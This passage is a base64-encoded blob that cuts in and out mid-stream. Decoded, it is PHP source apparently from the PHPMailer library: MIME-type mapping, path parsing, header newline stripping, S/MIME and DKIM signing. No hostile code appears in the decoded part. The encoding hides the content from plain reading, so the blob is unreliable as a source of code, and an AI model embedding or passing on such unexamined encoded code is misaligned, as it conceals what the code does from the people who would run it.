ByZWdfcmVwbGFjZSgnLzwoaGVhZHx0aXRsZXxzdHlsZXxzY3JpcHQpW14+XSo+Lio/PFwvAT4vc2knLCAnJywgJGh0bWwpKSksCiAgICAgICAgICAgIEVOVF9RVU9URVMsCiAgICAgICAgICAgICR0aGlzLT5DaGFyU2V0CiAgICAgICAgKTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgTUlNRSB0eXBlIGZvciBhIGZpbGUgZXh0ZW5zaW9uLgogICAgICogQHBhcmFtIHN0cmluZyAkZXh0IEZpbGUgZXh0ZW5zaW9uCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcgTUlNRSB0eXBlIG9mIGZpbGUuCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gX21pbWVfdHlwZXMoJGV4dCA9ICcnKQogICAgewogICAgICAgICRtaW1lcyA9IGFycmF5KAogICAgICAgICAgICAneGwnICAgID0+ICdhcHBsaWNhdGlvbi9leGNlbCcsCiAgICAgICAgICAgICdqcycgICAgPT4gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnLAogICAgICAgICAgICAnaHF4JyAgID0+ICdhcHBsaWNhdGlvbi9tYWMtYmluaGV4NDAnLAogICAgICAgICAgICAnY3B0JyAgID0+ICdhcHBsaWNhdGlvbi9tYWMtY29tcGFjdHBybycsCiAgICAgICAgICAgICdiaW4nICAgPT4gJ2FwcGxpY2F0aW9uL21hY2JpbmFyeScsCiAgICAgICAgICAgICdkb2MnICAgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsCiAgICAgICAgICAgICd3b3JkJyAgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsCiAgICAgICAgICAgICd4bHN4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnNoZWV0JywKICAgICAgICAgICAgJ3hsdHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwudGVtcGxhdGUnLAogICAgICAgICAgICAncG90eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwudGVtcGxhdGUnLAogICAgICAgICAgICAncHBzeCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGVzaG93JywKICAgICAgICAgICAgJ3BwdHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnByZXNlbnRhdGlvbicsCiAgICAgICAgICAgICdzbGR4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZScsCiAgICAgICAgICAgICdkb2N4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLmRvY3VtZW50JywKICAgICAgICAgICAgJ2RvdHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwudGVtcGxhdGUnLAogICAgICAgICAgICAneGxhbScgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuYWRkaW4ubWFjcm9FbmFibGVkLjEyJywKICAgICAgICAgICAgJ3hsc2InICA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLnNoZWV0LmJpbmFyeS5tYWNyb0VuYWJsZWQuMTInLAogICAgICAgICAgICAnY2xhc3MnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZGxsJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZG1zJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZXhlJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnbGhhJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnbHpoJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAncHNkJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnc2VhJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnc28nICAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnb2RhJyAgID0+ICdhcHBsaWNhdGlvbi9vZGEnLAogICAgICAgICAgICAncGRmJyAgID0+ICdhcHBsaWNhdGlvbi9wZGYnLAogICAgICAgICAgICAnYWknICAgID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgICAgICAgJ2VwcycgICA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsCiAgICAgICAgICAgICdwcycgICAgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAnc21pJyAgID0+ICdhcHBsaWNhdGlvbi9zbWlsJywKICAgICAgICAgICAgJ3NtaWwnICA9PiAnYXBwbGljYXRpb24vc21pbCcsCiAgICAgICAgICAgICdtaWYnICAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5taWYnLAogICAgICAgICAgICAneGxzJyAgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLAogICAgICAgICAgICAncHB0JyAgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtcG93ZXJwb2ludCcsCiAgICAgICAgICAgICd3YnhtbCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud2J4bWwnLAogICAgICAgICAgICAnd21sYycgID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndtbGMnLAogICAgICAgICAgICAnZGNyJyAgID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgICAgICAgJ2RpcicgICA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICAgICAgICdkeHInICAgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAgICAgICAnZHZpJyAgID0+ICdhcHBsaWNhdGlvbi94LWR2aScsCiAgICAgICAgICAgICdndGFyJyAgPT4gJ2FwcGxpY2F0aW9uL3gtZ3RhcicsCiAgICAgICAgICAgICdwaHAzJyAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BocDQnICA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwJyAgID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsCiAgICAgICAgICAgICdwaHRtbCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BocHMnICA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAtc291cmNlJywKICAgICAgICAgICAgJ3N3ZicgICA9PiAnYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2gnLAogICAgICAgICAgICAnc2l0JyAgID0+ICdhcHBsaWNhdGlvbi94LXN0dWZmaXQnLAogICAgICAgICAgICAndGFyJyAgID0+ICdhcHBsaWNhdGlvbi94LXRhcicsCiAgICAgICAgICAgICd0Z3onICAgPT4gJ2FwcGxpY2F0aW9uL3gtdGFyJywKICAgICAgICAgICAgJ3hodCcgICA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgICAgICAgICAgJ3hodG1sJyA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgICAgICAgICAgJ3ppcCcgICA9PiAnYXBwbGljYXRpb24vemlwJywKICAgICAgICAgICAgJ21pZCcgICA9PiAnYXVkaW8vbWlkaScsCiAgICAgICAgICAgICdtaWRpJyAgPT4gJ2F1ZGlvL21pZGknLAogICAgICAgICAgICAnbXAyJyAgID0+ICdhdWRpby9tcGVnJywKICAgICAgICAgICAgJ21wMycgICA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdtcGdhJyAgPT4gJ2F1ZGlvL21wZWcnLAogICAgICAgICAgICAnYWlmJyAgID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAnYWlmYycgID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAnYWlmZicgID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAncmFtJyAgID0+ICdhdWRpby94LXBuLXJlYWxhdWRpbycsCiAgICAgICAgICAgICdybScgICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3JwbScgICA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8tcGx1Z2luJywKICAgICAgICAgICAgJ3JhJyAgICA9PiAnYXVkaW8veC1yZWFsYXVkaW8nLAogICAgICAgICAgICAnd2F2JyAgID0+ICdhdWRpby94LXdhdicsCiAgICAgICAgICAgICdibXAnICAgPT4gJ2ltYWdlL2JtcCcsCiAgICAgICAgICAgICdnaWYnICAgPT4gJ2ltYWdlL2dpZicsCiAgICAgICAgICAgICdqcGVnJyAgPT4gJ2ltYWdlL2pwZWcnLAogICAgICAgICAgICAnanBlJyAgID0+ICdpbWFnZS9qcGVnJywKICAgICAgICAgICAgJ2pwZycgICA9PiAnaW1hZ2UvanBlZycsCiAgICAgICAgICAgICdwbmcnICAgPT4gJ2ltYWdlL3BuZycsCiAgICAgICAgICAgICd0aWZmJyAgPT4gJ2ltYWdlL3RpZmYnLAogICAgICAgICAgICAndGlmJyAgID0+ICdpbWFnZS90aWZmJywKICAgICAgICAgICAgJ2VtbCcgICA9PiAnbWVzc2FnZS9yZmM4MjInLAogICAgICAgICAgICAnY3NzJyAgID0+ICd0ZXh0L2NzcycsCiAgICAgICAgICAgICdodG1sJyAgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdodG0nICAgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdzaHRtbCcgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdsb2cnICAgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAndGV4dCcgID0+ICd0ZXh0L3BsYWluJywKICAgICAgICAgICAgJ3R4dCcgICA9PiAndGV4dC9wbGFpbicsCiAgICAgICAgICAgICdydHgnICAgPT4gJ3RleHQvcmljaHRleHQnLAogICAgICAgICAgICAncnRmJyAgID0+ICd0ZXh0L3J0ZicsCiAgICAgICAgICAgICd2Y2YnICAgPT4gJ3RleHQvdmNhcmQnLAogICAgICAgICAgICAndmNhcmQnID0+ICd0ZXh0L3ZjYXJkJywKICAgICAgICAgICAgJ3htbCcgICA9PiAndGV4dC94bWwnLAogICAgICAgICAgICAneHNsJyAgID0+ICd0ZXh0L3htbCcsCiAgICAgICAgICAgICdtcGVnJyAgPT4gJ3ZpZGVvL21wZWcnLAogICAgICAgICAgICAnbXBlJyAgID0+ICd2aWRlby9tcGVnJywKICAgICAgICAgICAgJ21wZycgICA9PiAndmlkZW8vbXBlZycsCiAgICAgICAgICAgICdtb3YnICAgPT4gJ3ZpZGVvL3F1aWNrdGltZScsCiAgICAgICAgICAgICdxdCcgICAgPT4gJ3ZpZGVvL3F1aWNrdGltZScsCiAgICAgICAgICAgICdydicgICAgPT4gJ3ZpZGVvL3ZuZC5ybi1yZWFsdmlkZW8nLAogICAgICAgICAgICAnYXZpJyAgID0+ICd2aWRlby94LW1zdmlkZW8nLAogICAgICAgICAgICAnbW92aWUnID0+ICd2aWRlby94LXNnaS1tb3ZpZScKICAgICAgICApOwogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKHN0cnRvbG93ZXIoJGV4dCksICRtaW1lcykpIHsKICAgICAgICAgICAgcmV0dXJuICRtaW1lc1tzdHJ0b2xvd2VyKCRleHQpXTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nOwogICAgfQoKICAgIC8qKgogICAgICogTWFwIGEgZmlsZSBuYW1lIHRvIGEgTUlNRSB0eXBlLgogICAgICogRGVmYXVsdHMgdG8gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsIGkuZS4uIGFyYml0cmFyeSBiaW5hcnkgZGF0YS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIEEgZmlsZSBuYW1lIG9yIGZ1bGwgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKQogICAgewogICAgICAgIC8vIEluIGNhc2UgdGhlIHBhdGggaXMgYSBVUkwsIHN0cmlwIGFueSBxdWVyeSBzdHJpbmcgYmVmb3JlIGdldHRpbmcgZXh0ZW5zaW9uCiAgICAgICAgJHFwb3MgPSBzdHJwb3MoJGZpbGVuYW1lLCAnPycpOwogICAgICAgIGlmIChmYWxzZSAhPT0gJHFwb3MpIHsKICAgICAgICAgICAgJGZpbGVuYW1lID0gc3Vic3RyKCRmaWxlbmFtZSwgMCwgJHFwb3MpOwogICAgICAgIH0KICAgICAgICAkcGF0aGluZm8gPSBzZWxmOjptYl9wYXRoaW5mbygkZmlsZW5hbWUpOwogICAgICAgIHJldHVybiBzZWxmOjpfbWltZV90eXBlcygkcGF0aGluZm9bJ2V4dGVuc2lvbiddKTsKICAgIH0KCiAgICAvKioKICAgICAqIE11bHRpLWJ5dGUtc2FmZSBwYXRoaW5mbyByZXBsYWNlbWVudC4KICAgICAqIERyb3AtaW4gcmVwbGFjZW1lbnQgZm9yIHBhdGhpbmZvKCksIGJ1dCBtdWx0aWJ5dGUtc2FmZSwgY3Jvc3MtcGxhdGZvcm0tc2FmZSwgb2xkLXZlcnNpb24tc2FmZS4KICAgICAqIFdvcmtzIHNpbWlsYXJseSB0byB0aGUgb25lIGluIFBIUCA+PSA1LjIuMAogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5wYXRoaW5mby5waHAjMTA3NDYxCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIEEgZmlsZW5hbWUgb3IgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqIEBwYXJhbSBpbnRlZ2VyfHN0cmluZyAkb3B0aW9ucyBFaXRoZXIgYSBQQVRISU5GT18qIGNvbnN0YW50LAogICAgICogICAgICBvciBhIHN0cmluZyBuYW1lIHRvIHJldHVybiBvbmx5IHRoZSBzcGVjaWZpZWQgcGllY2UsIGFsbG93cyAnZmlsZW5hbWUnIHRvIHdvcmsgb24gUEhQIDwgNS4yCiAgICAgKiBAcmV0dXJuIHN0cmluZ3xhcnJheQogICAgICogQHN0YXRpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG1iX3BhdGhpbmZvKCRwYXRoLCAkb3B0aW9ucyA9IG51bGwpCiAgICB7CiAgICAgICAgJHJldCA9IGFycmF5KCdkaXJuYW1lJyA9PiAnJywgJ2Jhc2VuYW1lJyA9PiAnJywgJ2V4dGVuc2lvbicgPT4gJycsICdmaWxlbmFtZScgPT4gJycpOwogICAgICAgICRwYXRoaW5mbyA9IGFycmF5KCk7CiAgICAgICAgaWYgKHByZWdfbWF0Y2goJyVeKC4qPylbXC9dKigoW14vXF0qPykoXC4oW15cLlwvXSs/KXwpKVtcL1wuXSokJWltJywgJHBhdGgsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMSwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnZGlybmFtZSddID0gJHBhdGhpbmZvWzFdOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgICAgICRyZXRbJ2Jhc2VuYW1lJ10gPSAkcGF0aGluZm9bMl07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoNSwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnZXh0ZW5zaW9uJ10gPSAkcGF0aGluZm9bNV07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMywgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnZmlsZW5hbWUnXSA9ICRwYXRoaW5mb1szXTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBzd2l0Y2ggKCRvcHRpb25zKSB7CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRElSTkFNRToKICAgICAgICAgICAgY2FzZSAnZGlybmFtZSc6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZGlybmFtZSddOwogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0JBU0VOQU1FOgogICAgICAgICAgICBjYXNlICdiYXNlbmFtZSc6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnYmFzZW5hbWUnXTsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19FWFRFTlNJT046CiAgICAgICAgICAgIGNhc2UgJ2V4dGVuc2lvbic6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZXh0ZW5zaW9uJ107CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRklMRU5BTUU6CiAgICAgICAgICAgIGNhc2UgJ2ZpbGVuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydmaWxlbmFtZSddOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXQ7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IG9yIHJlc2V0IGluc3RhbmNlIHByb3BlcnRpZXMuCiAgICAgKiBZb3Ugc2hvdWxkIGF2b2lkIHRoaXMgZnVuY3Rpb24gLSBpdCdzIG1vcmUgdmVyYm9zZSwgbGVzcyBlZmZpY2llbnQsIG1vcmUgZXJyb3ItcHJvbmUgYW5kCiAgICAgKiBoYXJkZXIgdG8gZGVidWcgdGhhbiBzZXR0aW5nIHByb3BlcnRpZXMgZGlyZWN0bHkuCiAgICAgKiBVc2FnZSBFeGFtcGxlOgogICAgICogYCRtYWlsLT5zZXQoJ1NNVFBTZWN1cmUnLCAndGxzJyk7YAogICAgICogICBpcyB0aGUgc2FtZSBhczoKICAgICAqIGAkbWFpbC0+U01UUFNlY3VyZSA9ICd0bHMnO2AKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lIFRoZSBwcm9wZXJ0eSBuYW1lIHRvIHNldAogICAgICogQHBhcmFtIG1peGVkICR2YWx1ZSBUaGUgdmFsdWUgdG8gc2V0IHRoZSBwcm9wZXJ0eSB0bwogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKiBAVE9ETyBTaG91bGQgdGhpcyBub3QgYmUgdXNpbmcgdGhlIF9fc2V0KCkgbWFnaWMgZnVuY3Rpb24/CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXQoJG5hbWUsICR2YWx1ZSA9ICcnKQogICAgewogICAgICAgIGlmIChwcm9wZXJ0eV9leGlzdHMoJHRoaXMsICRuYW1lKSkgewogICAgICAgICAgICAkdGhpcy0+JG5hbWUgPSAkdmFsdWU7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygndmFyaWFibGVfc2V0JykgLiAkbmFtZSk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTdHJpcCBuZXdsaW5lcyB0byBwcmV2ZW50IGhlYWRlciBpbmplY3Rpb24uCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VjdXJlSGVhZGVyKCRzdHIpCiAgICB7CiAgICAgICAgcmV0dXJuIHRyaW0oc3RyX3JlcGxhY2UoYXJyYXkoIgoiLCAiCiIpLCAnJywgJHN0cikpOwogICAgfQoKICAgIC8qKgogICAgICogTm9ybWFsaXplIGxpbmUgYnJlYWtzIGluIGEgc3RyaW5nLgogICAgICogQ29udmVydHMgVU5JWCBMRiwgTWFjIENSIGFuZCBXaW5kb3dzIENSTEYgbGluZSBicmVha3MgaW50byBhIHNpbmdsZSBsaW5lIGJyZWFrIGZvcm1hdC4KICAgICAqIERlZmF1bHRzIHRvIENSTEYgKGZvciBtZXNzYWdlIGJvZGllcykgYW5kIHByZXNlcnZlcyBjb25zZWN1dGl2ZSBicmVha3MuCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0ZXh0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRicmVha3R5cGUgV2hhdCBraW5kIG9mIGxpbmUgYnJlYWsgdG8gdXNlLCBkZWZhdWx0cyB0byBDUkxGCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBzdGF0aWMKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBub3JtYWxpemVCcmVha3MoJHRleHQsICRicmVha3R5cGUgPSAiCiIpCiAgICB7CiAgICAgICAgcmV0dXJuIHByZWdfcmVwbGFjZSgnLygKfAp8CikvbXMnLCAkYnJlYWt0eXBlLCAkdGV4dCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIHB1YmxpYyBhbmQgcHJpdmF0ZSBrZXkgZmlsZXMgYW5kIHBhc3N3b3JkIGZvciBTL01JTUUgc2lnbmluZy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjZXJ0X2ZpbGVuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXlfZmlsZW5hbWUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleV9wYXNzIFBhc3N3b3JkIGZvciBwcml2YXRlIGtleQogICAgICogQHBhcmFtIHN0cmluZyAkZXh0cmFjZXJ0c19maWxlbmFtZSBPcHRpb25hbCBwYXRoIHRvIGNoYWluIGNlcnRpZmljYXRlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzaWduKCRjZXJ0X2ZpbGVuYW1lLCAka2V5X2ZpbGVuYW1lLCAka2V5X3Bhc3MsICRleHRyYWNlcnRzX2ZpbGVuYW1lID0gJycpCiAgICB7CiAgICAgICAgJHRoaXMtPnNpZ25fY2VydF9maWxlID0gJGNlcnRfZmlsZW5hbWU7CiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X2ZpbGUgPSAka2V5X2ZpbGVuYW1lOwogICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzID0gJGtleV9wYXNzOwogICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSA9ICRleHRyYWNlcnRzX2ZpbGVuYW1lOwogICAgfQoKICAgIC8qKgogICAgICogUXVvdGVkLVByaW50YWJsZS1lbmNvZGUgYSBES0lNIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eHQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1FQKCR0eHQpCiAgICB7CiAgICAgICAgJGxpbmUgPSAnJzsKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCBzdHJsZW4oJHR4dCk7ICRpKyspIHsKICAgICAgICAgICAgJG9yZCA9IG9yZCgkdHh0WyRpXSk7CiAgICAgICAgICAgIGlmICgoKDB4MjEgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHgzQSkpIHx8ICRvcmQgPT0gMHgzQyB8fCAoKDB4M0UgPD0gJG9yZCkgJiYgKCRvcmQgPD0gMHg3RSkpKSB7CiAgICAgICAgICAgICAgICAkbGluZSAuPSAkdHh0WyRpXTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRsaW5lIC49ICc9JyAuIHNwcmludGYoJyUwMlgnLCAkb3JkKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGxpbmU7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZW5lcmF0ZSBhIERLSU0gc2lnbmF0dXJlLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHNpZ25IZWFkZXIKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgREtJTSBzaWduYXR1cmUgdmFsdWUKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fU2lnbigkc2lnbkhlYWRlcikKICAgIHsKICAgICAgICBpZiAoIWRlZmluZWQoJ1BLQ1M3X1RFWFQnKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgJHByaXZLZXlTdHIgPSAhZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpID8gJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcgOiBmaWxlX2dldF9jb250ZW50cygkdGhpcy0+REtJTV9wcml2YXRlKTsKICAgICAgICBpZiAoJycgIT0gJHRoaXMtPkRLSU1fcGFzc3BocmFzZSkgewogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0ciwgJHRoaXMtPkRLSU1fcGFzc3BocmFzZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHByaXZLZXkgPSBvcGVuc3NsX3BrZXlfZ2V0X3ByaXZhdGUoJHByaXZLZXlTdHIpOwogICAgICAgIH0KICAgICAgICAvL1dvcmthcm91bmQgZm9yIG1pc3NpbmcgZGlnZXN0IGFsZ29yaXRobXMgaW4gb2xkIFBIUCAmIE9wZW5TU0wgdmVyc2lvbnMKICAgICAgICAvL0BsaW5rIGh0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9hLzExMTE3MzM4LzMzMzM0MAogICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcpID49IDAgYW5kCiAgICAgICAgICAgIGluX2FycmF5KCdzaGEyNTZXaXRoUlNBRW5jcnlwdGlvbicsIG9wZW5zc2xfZ2V0X21kX21ldGhvZHModHJ1ZSkpKSB7CiAgICAgICAgICAgIGlmIChvcGVuc3NsX3NpZ24oJHNpZ25IZWFkZXIsICRzaWduYXR1cmUsICRwcml2S2V5LCAnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nKSkgewogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgICAgICAgICAgcmV0dXJuIGJhc2U2NF9lbmNvZGUoJHNpZ25hdHVyZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcGluZm8gPSBvcGVuc3NsX3BrZXlfZ2V0X2RldGFpbHMoJHByaXZLZXkpOwogICAgICAgICAgICAkaGFzaCA9IGhhc2goJ3NoYTI1NicsICRzaWduSGVhZGVyKTsKICAgICAgICAgICAgLy8nTWFnaWMnIGNvbnN0YW50IGZvciBTSEEyNTYgZnJvbSBSRkMzNDQ3CiAgICAgICAgICAgIC8vQGxpbmsgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzM0NDcjcGFnZS00MwogICAgICAgICAgICAkdCA9ICczMDMxMzAwZDA2MDk2MDg2NDgwMTY1MDMwNDAyMDEwNTAwMDQyMCcgLiAkaGFzaDsKICAgICAgICAgICAgJHBzbGVuID0gJHBpbmZvWydiaXRzJ10gLyA4IC0gKHN0cmxlbigkdCkgLyAyICsgMyk7CiAgICAgICAgICAgICRlYiA9IHBhY2soJ0gqJywgJzAwMDEnIC4gc3RyX3JlcGVhdCgnRkYnLCAkcHNsZW4pIC4gJzAwJyAuICR0KTsKCiAgICAgICAgICAgIGlmIChvcGVuc3NsX3ByaXZhdGVfZW5jcnlw